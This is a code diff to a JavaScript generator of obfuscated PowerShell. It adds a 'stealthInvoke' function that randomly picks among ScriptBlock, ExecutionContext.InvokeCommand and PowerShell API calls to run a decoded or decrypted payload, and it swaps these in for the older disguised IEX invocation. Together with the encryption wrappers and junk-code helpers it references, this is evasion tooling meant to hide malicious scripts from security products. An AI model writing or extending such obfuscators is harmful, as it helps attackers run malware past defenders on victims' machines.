@@ -299,6 +299,21 @@ function psShuf(arr) {
   const a = [...arr]; for (let i = a.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [a[i], a[j]] = [a[j], a[i]] }; return a
 }
 
+/* ── Stealth Invocation (v4.7) ───────────────────────────── */
+
+function stealthInvoke(payloadExpr) {
+  const pv = randomVarName('short')
+  const methods = [
+    // ScriptBlock::Create().Invoke()
+    () => `$${pv} = ${payloadExpr}\n[ScriptBlock]::Create($${pv}).Invoke()`,
+    // ExecutionContext.InvokeCommand
+    () => `$${pv} = ${payloadExpr}\n$ExecutionContext.InvokeCommand.InvokeScript($${pv})`,
+    // PowerShell API
+    () => `$${pv} = ${payloadExpr}\n[PowerShell]::Create().AddScript($${pv}).Invoke()`,
+  ]
+  return methods[Math.floor(Math.random() * methods.length)]()
+}
+
 function applyEncryptionWrapper(code) {
   const m = Math.floor(Math.random() * 4)
   switch (m) {
@@ -336,7 +351,7 @@ ${psLoopJunk(iv)}
     return [System.Text.Encoding]::ASCII.GetString($${rv})
 }
 
-& ($ShellId[1]+$ShellId[13]+'X') ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${fv} $${dv} $${kv})))
+${stealthInvoke(`[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${fv} $${dv} $${kv}))`)}
 `
 }
 
@@ -361,7 +376,7 @@ ${psLoopJunk('i')}
     return $${rv}
 }
 
-& ($ShellId[1]+$ShellId[13]+'X') (${fv} $${dv} $${sv})
+${stealthInvoke(`(${fv} $${dv} $${sv})`)}
 `
 }
 
@@ -385,7 +400,7 @@ ${psLoopJunk('i')}
     return $${rv}
 }
 
-& ($ShellId[1]+$ShellId[13]+'X') (${fv} $${dv} $${k1v} $${k2v})
+${stealthInvoke(`(${fv} $${dv} $${k1v} $${k2v})`)}
 `
 }
 
@@ -410,6 +425,6 @@ ${psLoopJunk('i')}
     return $${rv}
 }
 
-& ($ShellId[1]+$ShellId[13]+'X') ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${fv} $${dv} $${nv})))
+${stealthInvoke(`[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${fv} $${dv} $${nv}))`)}
 `
 }
